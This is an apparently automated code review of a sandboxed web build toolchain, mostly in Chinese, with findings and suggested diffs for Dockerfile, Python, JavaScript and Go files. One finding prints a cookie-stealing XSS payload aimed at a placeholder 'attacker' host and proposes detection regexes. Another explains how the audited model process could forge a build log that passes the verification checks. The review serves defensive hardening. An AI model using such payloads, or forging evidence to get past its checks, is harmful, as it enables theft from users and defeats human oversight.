Review complete: 20 finding(s) across 14 selected item(s).

─── docker/craft/Dockerfile:233-236 ───
[maintainability · medium] web_toolchain 的
pin（template_sha256、两个依赖摘要、build_program_sha256、toolchain_digest）在
docker/craft/web/toolchain.lock.json 和 docker/craft/runtime-config.json 中各存一份，但镜像构建期只校验了「文件 vs
lock」这一份，没有任何步骤校验「runtime-config.json 的 web_toolchain vs lock」。craft_web_build.go 的注释明确声称
"toolchain.lock.json + runtime-config.json both carry it, so three independent derivations must
agree"，而实际上这两个文件之间的一致性从未被强制执行。若后续升级工具链（更新 web/ 文件 + lock）却忘记同步 runtime-config.json，镜像仍会构建成功，而
runtime-config.json 正是探针哈希的运行时身份文件，身份会静默携带过期的工具链元数据。建议在 `COPY runtime-config.json`（第 243 行）之后的 RUN
步骤追加一次一致性断言，使两份权威在构建期强制对齐。

-     printf '%s  %s\n' "$expected_template" template.html | sha256sum -c -; \
-     printf '%s  %s\n' "$expected_css" deps/craft-web.css | sha256sum -c -; \
-     printf '%s  %s\n' "$expected_js" deps/craft-web.js | sha256sum -c -; \
-     printf '%s  %s\n' "$expected_build" build.py | sha256sum -c -; \
+ # 在现有 `RUN chmod 0644 /etc/craft/runtime-config.json` 步骤中追加构建期交叉校验：
+ RUN set -eux; \
+     chmod 0644 /etc/craft/runtime-config.json; \
+     python3 -c 'import json; l=json.load(open("/opt/craft/web/toolchain.lock.json")); w=json.load(open("/etc/craft/runtime-config.json"))["web_toolchain"]; v=lambda t,d,b,g:(t,sorted((x["name"],x["sha256"]) for x in d),b,g); assert v(l["template"]["sha256"],l["dependencies"],l["build_program"]["sha256"],l["toolchain_digest"])==v(w["template_sha256"],w["dependencies"],w["build_program_sha256"],w["toolchain_digest"]), "runtime-config.json web_toolchain pins drifted from toolchain.lock.json"'


─── docker/craft/web/build.py:66-66 ───
[security · high] 外链/活动内容黑名单漏掉了 `<script>` 标签与内联事件属性：EMBED_TAG_RE 只拦 base/iframe/object/embed/form，而
staged html 片段是不可信输入（沙箱 agent 处理用户上传材料产出）。片段
`<script>location='ht'+'tp://attacker/x?'+document.cookie</script>`（字符串拼接规避字面 `://` 扫描）或 `<img src=x
onerror=...>`（`src=x` 不匹配 ABSOLUTE_REF_RE）可通过全部校验并在产物页面执行任意脚本；最终用户的浏览器打开预览时并无构建期 no-egress
保护，违背文件头"引用外部 origin 即构建失败"的声明。平台侧（internal/container/craft_web_build.go）只严格解析 build-log，不重扫 entry
字节，此处是唯一内容闸门。建议补拦 script 标签与 on* 事件属性，或改用标签白名单。

+ SCRIPT_TAG_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE)
+ EVENT_ATTR_RE = re.compile(r"\son[a-z]+\s*=", re.IGNORECASE)
  EMBED_TAG_RE = re.compile(r"<\s*(base|iframe|object|embed|form)\b", re.IGNORECASE)
+ # 并在 render_html 的 (pattern, why) 列表中加入:
+ #   (SCRIPT_TAG_RE, "script tag"),
+ #   (EVENT_ATTR_RE, "inline event handler attribute"),


─── docker/craft/web/build.py:257-259 ───
[bug · medium] 畸形 content.json 会逃出 BuildError 处理链：json.load 对非法 JSON 抛
JSONDecodeError（ValueError），合法但非对象的载荷（如 `[]`、`"x"`、`123`）使 `.get` 抛 AttributeError；main 与模块级
`__main__` 均只捕获 BuildError，结果是退出码 1 + 回溯且不写 build-log.json，违反"build log is written for every
termination"与"退出码仅 0/2/3/4"的自身契约（无效暂存内容应为 EXIT_CONTENT=3；Go 消费方此时只能把构建事实置为未观测）。

      with content_path.open("r", encoding="utf-8") as handle:
+         try:
-         content = json.load(handle)
+             content = json.load(handle)
+         except ValueError as exc:
+             raise BuildError(EXIT_CONTENT, "content.json is not valid JSON: {}".format(exc))
+     if not isinstance(content, dict):
+         raise BuildError(EXIT_CONTENT, "content.json must be a JSON object")
      title = content.get("title")


─── docker/craft/web/build.py:220-221 ───
[bug · medium] render_table 在 `.get` 之前未校验 table 是 dict：形如 {"heading": "x", "table": "boom"} 的
section 使 table.get 抛 AttributeError，逃出 BuildError 处理链（退出码 1、无 build-log），而非预期的 EXIT_CONTENT=3。后续的
isinstance 检查发生在首次 .get 之后，保护不到这一步。

+     if not isinstance(table, dict):
+         raise BuildError(EXIT_CONTENT, "table section {!r} must be an object".format(heading))
      columns = table.get("columns", [])
      rows = table.get("rows", [])


─── docker/craft/web/build.py:145-147 ───
[bug · medium] 畸形 toolchain.lock.json 同样逃逸：非法 JSON 抛 JSONDecodeError，非对象 JSON（如顶层数组）在 lock.get 处抛
AttributeError，模板/构建程序子字段为字符串时在嵌套 .get 处抛 AttributeError——均未被 BuildError 捕获（退出码 1、无
build-log）。pin_from_lock 已捕获 ValueError/OSError 说明作者预期了该场景，但主校验路径漏防；损坏的 lock 应报 EXIT_TOOLCHAIN=2。

      with lock_path.open("r", encoding="utf-8") as handle:
+         try:
-         lock = json.load(handle)
+             lock = json.load(handle)
+         except ValueError as exc:
+             raise BuildError(EXIT_TOOLCHAIN, "toolchain lock is not valid JSON: {}".format(exc))
+     if not isinstance(lock, dict) or not isinstance(lock.get("template"), dict) or not isinstance(lock.get("build_program"), dict):
+         raise BuildError(EXIT_TOOLCHAIN, "toolchain lock must be an object with template/build_program objects")
      if lock.get("name") != TOOLCHAIN_NAME:


─── docker/craft/web/build.py:293-295 ───
[bug · low] 顺序 replace 存在占位符注入：用户可控的 title/subtitle/lang 若含 `{{CRAFT_CONTENT}}`
会在后续轮次被二次展开，把全部渲染内容复制进 <title>/页头；含未知占位符（如 `{{CRAFT_FOO}}`）则触发误导性的 EXIT_RENDER"template placeholder
left unfilled"（实为内容注入而非模板问题）。建议对用户值先转义 `{{`，并用单趟 re.sub 替换（插入值不再被重扫）。

-     entry = template
-     for key, value in replacements.items():
-         entry = entry.replace("{{" + key + "}}", value)
+     for key in ("CRAFT_LANG", "CRAFT_TITLE", "CRAFT_SUBTITLE"):
+         replacements[key] = replacements[key].replace("{{", "&#123;&#123;")
+     entry = re.sub(
+         r"\{\{(CRAFT_[A-Z_]+)\}\}",
+         lambda match: replacements.get(match.group(1), match.group(0)),
+         template,
+     )


─── docker/craft/web/build.py:399-401 ───
[bug · medium] main 与模块级 __main__ 均只捕获 BuildError:构建过程中的 I/O
失败(输出目录不可写、磁盘满、shutil.copyfile/write_text/mkdir 抛出的 OSError)会以未捕获异常终止——退出码 1 + traceback 且不写
build-log.json,违反文件头与 main 注释中"build log is written for every termination"及"退出码仅 0/2/3/4"的自身契约。已确认
Go 侧 craftWebBuildEvidenceSource 在读不到日志时 BuildRan 保持 unobserved,构建证据会丢失。与已确认的 JSON 畸形逃逸(发现
2/4)成因不同,这是 I/O 失败路径缺少兜底,建议补捕 OSError 归入 EXIT_RENDER 并照常写日志。

      try:
          return build(args.toolchain, args.input, args.output, args.runtime_digest)
      except BuildError as failure:
+         ...
+     except OSError as failure:
+         pin = pin_from_lock(args.toolchain)
+         write_build_log(args.output, pin, args.runtime_digest, EXIT_RENDER, [], "output failure: {}".format(failure))
+         print("craft web build failed (exit {}): {}".format(EXIT_RENDER, failure), file=sys.stderr)
+         return EXIT_RENDER


─── docker/craft/web/deps/craft-web.js:26-31 ───
[bug · medium] boot() 用 document.querySelector 只取第一个 .craft-filter 和第一张 table.craft-table 绑定。但
build.py 的 render_table 为每个 table section 都渲染一对筛选框+表格,且 load_content 允许 content.json 包含任意多个 table
section;当存在两个及以上表格时,第二个及以后的筛选输入框是无响应的死控件。建议遍历所有表格并配对各自紧邻的前置筛选框(render_table 的输出顺序为
h2、input.craft-filter、table)。

    function boot() {
-     var input = document.querySelector(".craft-filter");
-     var table = document.querySelector("table.craft-table");
-     if (!input || !table) { return; }
-     input.addEventListener("input", function () { filterTable(input, table); });
+     const tables = document.querySelectorAll("table.craft-table");
+     for (const table of tables) {
+       const input = table.previousElementSibling;
+       if (!input || !input.classList.contains("craft-filter")) { continue; }
+       input.addEventListener("input", () => filterTable(input, table));
+     }
    }


─── docker/craft/web/deps/craft-web.js:12-13 ───
[style · low] 整个文件使用 var 声明变量(needle/rows/i/row/haystack/hit/input/table),按仓库 JS 规范应使用 const/let;var
的函数级作用域在循环+回调捕获场景(var i)也容易埋下隐患。建议统一改为 const/let。

-     var needle = normalize(input.value);
-     var rows = table.querySelectorAll("tbody tr");
+     const needle = normalize(input.value);
+     const rows = table.querySelectorAll("tbody tr");


─── docs/testing/craft/t04/offline-build-output/craft-web.css:1-3 ───
[test · low] 本快照目录的 craft-web.css / craft-web.js / index.html 是 docker/craft/web/deps/* 与
template.html 构建产物的人工拷贝，当前与源逐字一致，但没有自动校验：后续 deps 或模板升级（toolchain.lock.json 的 template_sha256 / 依赖
sha256 / toolchain_digest 变化）而快照未同步时，T04 测试证据将失真并误导排查。建议在 CI 中按 toolchain.lock.json 的 sha256 校验快照资产与
deps 逐字一致、并可重跑 build.py --selftest 比对产物，或直接由构建脚本自动再生本快照。



─── docs/testing/craft/t04/offline-build-output/craft-web.js:11-17 ───
[style · medium] 全文使用 var 声明（此处 needle/rows/i/row/haystack/hit，另 boot() 中 input/table），违反项目规范「禁止
var，统一使用 let/const」。注意本文件是 docker/craft/web/deps/craft-web.js 的逐字副本，修复需落在 deps 源文件并同步更新
toolchain.lock.json 中该文件的 sha256 与 toolchain_digest，再随构建产物更新本快照，否则会破坏 pin 校验。

    function filterTable(input, table) {
-     var needle = normalize(input.value);
-     var rows = table.querySelectorAll("tbody tr");
-     for (var i = 0; i < rows.length; i++) {
-       var row = rows[i];
-       var haystack = normalize(row.textContent);
-       var hit = needle === "" || haystack.indexOf(needle) !== -1;
+     const needle = normalize(input.value);
+     const rows = table.querySelectorAll("tbody tr");
+     for (let i = 0; i < rows.length; i++) {
+       const row = rows[i];
+       const haystack = normalize(row.textContent);
+       const hit = needle === "" || haystack.indexOf(needle) !== -1;


─── docs/testing/craft/t04/offline-build-output/craft-web.js:8-8 ───
[style · low] text == null 使用宽松相等，违反「统一使用 === / !==」规范，且与同文件其余严格比较（needle === ""、!==
-1）混用，存在隐式类型转换隐患。虽意图是同时覆盖 null 与 undefined，仍应显式判断。

-     return String(text == null ? "" : text).trim().toLowerCase();
+     return String(text === null || text === undefined ? "" : text).trim().toLowerCase();


─── docs/testing/craft/t04/offline-build-output/index.html:7-7 ───
[bug · medium] 快照不自包含：本目录实际的 craft-web.css / craft-web.js 与 index.html 同级平铺，不存在 assets/ 子目录，因此这里以及第
21 行 <script src="assets/craft-web.js"> 的引用在直接打开或托管该快照时都会 404，预览可达性无从复核。同时 build-log.json 的 assets
字段为 ["assets/craft-web.css",
"assets/craft-web.js"]，与快照实际布局自相矛盾。build.py（docker/craft/web/build.py）的真实构建会把依赖复制到 output/assets/
子目录并以 assets/<name> 记录，快照应还原真实输出布局（把两个依赖移入 assets/ 子目录），否则作为 T04 固定测试证据会误导后续排查。



─── docs/testing/craft/t04/offline-build-output/index.html:15-15 ───
[bug · low] aria-label="filter rows" 为英文，与页面 lang="zh-CN"、占位符「筛选行…」及全文中文文案不一致，中文读屏用户会听到中英混杂提示。该字符串由
build.py 的 render_table 硬编码输出，根因在生成器侧；建议源头统一为中文（并同步重生成快照），而非在快照里单独改。

- <h2>按省销售额</h2><input class="craft-filter" type="search" placeholder="筛选行…" aria-label="filter rows"><table class="craft-table"><thead><tr><th>省份</th><th>销售额（万元）</th></tr></thead><tbody><tr><td>浙江</td><td>96</td></tr><tr><td>江苏</td><td>12</td></tr></tbody></table>
+ <input class="craft-filter" type="search" placeholder="筛选行…" aria-label="筛选行">


─── internal/container/craft_web_build.go:305-307 ───
[security · medium] build evidence 的信任边界存在缺口：build-log.json 位于 /workspace/output（Dockerfile 第 96/279
行确认该目录归 OpenCode 进程运行的 craft 用户所有且可写），而验证所锚定的全部值（toolchain_digest、template_sha256）对 sandbox
内进程公开可读（/opt/craft/web 为 root:0555，/etc/craft/runtime-config.json 为 0644）。因此被审计的模型进程可以不运行
build.py，直接手写一份通过 ParseCraftWebBuildLog 与本函数全部校验、exit_code=0 的日志，使 BuildChecks 将 CheckBuild 判为
passed（"build exited 0"）。这与 ArtifactEvidence 注释声明的 "externally observed verification facts"
语义冲突——该字段实为被审计方可控的自我声明，非外部观测。同时 log.RuntimeDigest 只被验证非空，未与部署侧已有的 craftRuntimeDigestFromEnv()
值比对。建议：至少将部署 runtime digest 一并传入并与 log.RuntimeDigest 比对，并考虑与 delegation 的 bash 工具调用事件（OpenCode 事件流中
build.py 的真实退出状态）交叉验证；或在本机制注释中明确 build check 是声明性事实，避免下游将其当作防伪证据。

- 		evidence.BuildRan = build.BuildRan
- 		evidence.BuildExitCode = build.BuildExitCode
- 		return evidence
+ 	// 建议在 pin 中携带部署 runtime digest 并比对：
+ 	// if log.RuntimeDigest != pin.RuntimeDigest {
+ 	// 	return craft.ArtifactEvidence{}, fmt.Errorf("%w: build log names runtime %s, deployment runs %s", craft.ErrConflict, log.RuntimeDigest, pin.RuntimeDigest)
+ 	// }


─── internal/container/craft_web_build.go:293-304 ───
[maintainability · medium] 三种拒绝路径（读错误、解析失败、pin 不匹配）全部静默返回 inner evidence，无任何日志。同包 craft_runtime.go
对类似场景已有 logger.Warnf 惯例（如 "Run-bound candidate staging failed"）。后果：当构建确实运行过（例如 exit_code=2
的失败日志）但日志畸形或 toolchain 不匹配时，BuildChecks 报 not_run（"no build step was
observed"），运营者完全无从得知存在一份被拒绝的日志及其被拒原因——尤其"日志存在但指向外部工具链"本身是值得告警的篡改信号。fail-closed 语义本身正确，但建议在
Parse/CraftWebBuildEvidence 失败时输出一条 Warn（文件不存在是常态可不记）。

  		raw, err := readLog(ctx, task)
  		if err != nil || len(raw) == 0 {
  			return evidence
  		}
  		log, err := ParseCraftWebBuildLog(raw)
  		if err != nil {
+ 			logger.Warnf(ctx, "[CraftWebBuild] rejecting build log for session %s: %v", task.Scope.SessionID, err)
  			return evidence
  		}
  		build, err := CraftWebBuildEvidence(log, pin)
  		if err != nil {
+ 			logger.Warnf(ctx, "[CraftWebBuild] refusing build log evidence for session %s: %v", task.Scope.SessionID, err)
  			return evidence
  		}


─── internal/container/craft_web_build.go:327-331 ───
[maintainability · low] 同包 craft_runview_container_provider.go 第 1533-1543 行已存在功能完全相同的
sameStrings。同一 package 内重复实现会导致后续维护两处分叉。建议删除 equalStrings，直接复用 sameStrings。

- // equalStrings reports element-wise equality of two slices.
- func equalStrings(a, b []string) bool {
- 	if len(a) != len(b) {
- 		return false
- 	}
+ // 删除 equalStrings，调用点改用同包已有的 sameStrings（craft_runview_container_provider.go）。
+ 	if !sameStrings(listed, fixed) {


─── internal/container/craft_web_build.go:342-346 ───
[bug · low] fileDigestOrEmpty 将"文件不存在/不可读"折叠为空串，调用方随之返回 "bytes differ from the
pin"（craft.ErrConflict）。部署错误（CRAFT_WEB_TOOLCHAIN_DIR 指向缺少 deps/ 子目录或文件未落盘的路径）会被误报为内容篡改（conflict），而
craft_runtime.go:148 的调用点据此拒绝整个 executor 组装，运营者收到的是误导性错误类别与文案。建议返回具体读取错误或区分 os.IsNotExist，让
ErrConflict 仅表示"读到字节但哈希不符"。

- func fileDigestOrEmpty(path string) string {
+ func fileDigest(path string) (string, error) {
  	raw, err := os.ReadFile(path)
  	if err != nil {
- 		return ""
+ 		return "", fmt.Errorf("%w: craft web pinned file unreadable: %v", craft.ErrInvalidInput, err)
+ 	}
+ 	sum := sha256.Sum256(raw)
+ 	return hex.EncodeToString(sum[:]), nil
- 	}
+ }


─── internal/container/craft_web_build.go:265-270 ───
[maintainability · low] TemplateVersion 与 RuntimeDigest 两个字段"验证后不使用"：pin.TemplateVersion 在
LoadCraftWebToolchainPin 中强制非空并返回，但唯一调用点（craft_runtime.go:146-150）只把 pin 传入
craftWebBuildEvidenceSource，而本函数只比对 ToolchainDigest 与 TemplateSHA256——由于 toolchain digest 的推导不含
version（Python 端 toolchain_digest 同样只用 template_sha），log 可声明任意非空 TemplateVersion 而通过全部校验。同理
log.RuntimeDigest 仅验非空。建议要么在此补上 log.TemplateVersion != pin.TemplateVersion 的比对（以及与部署 runtime digest
的比对），要么删掉这两处无消费方的校验，避免形成"已验证"的错觉。

- 	if log.ToolchainDigest != pin.ToolchainDigest {
- 		return craft.ArtifactEvidence{}, fmt.Errorf("%w: build log names toolchain %s, deployment pins %s", craft.ErrConflict, log.ToolchainDigest, pin.ToolchainDigest)
- 	}
  	if log.TemplateSHA256 != pin.TemplateSHA256 {
  		return craft.ArtifactEvidence{}, fmt.Errorf("%w: build log names template %s, deployment pins %s", craft.ErrConflict, log.TemplateSHA256, pin.TemplateSHA256)
+ 	}
+ 	if log.TemplateVersion != pin.TemplateVersion {
+ 		return craft.ArtifactEvidence{}, fmt.Errorf("%w: build log names template version %s, deployment pins %s", craft.ErrConflict, log.TemplateVersion, pin.TemplateVersion)
  	}


─── internal/container/craft_web_build.go:247-249 ───
[style · low] strings.HasPrefix(asset, "//") 永远不可达：前一个操作数 strings.HasPrefix(asset, "/") 已涵盖所有以 //
开头的字符串（短路求值下第二个条件不可能为真）。属于死代码，建议删除多余条件。

- 	if strings.HasPrefix(asset, "/") || strings.HasPrefix(asset, "//") {
+ 	if strings.HasPrefix(asset, "/") {
  		return fmt.Errorf("%w: craft web asset %q must be relative, not absolute", craft.ErrInvalidInput, asset)
  	}

